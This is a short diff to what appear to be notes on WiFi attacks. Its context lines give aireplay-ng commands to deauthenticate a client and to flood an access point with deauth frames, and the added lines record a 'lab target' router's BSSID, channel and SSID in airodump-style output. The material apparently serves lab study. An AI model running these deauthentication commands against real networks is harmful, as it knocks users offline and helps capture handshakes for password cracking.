@@ -73,7 +73,10 @@ Next we DOS the target AP, or deauth a client
 sudo aireplay-ng -0 1 -a <AP_MAC> -c <CLIENT_MAC> <interface>
 sudo aireplay-ng -0 0 -a <AP_MAC> <interface>
 
-
+Lab target
+---------------------------------------------------------------------
+5C:A6:E6:F3:C3:B8  -55      116        0    0   9  270   WPA2 CCMP   PSK  TP-Link_C3B8
+---------------------------------------------------------------------
 
 
 
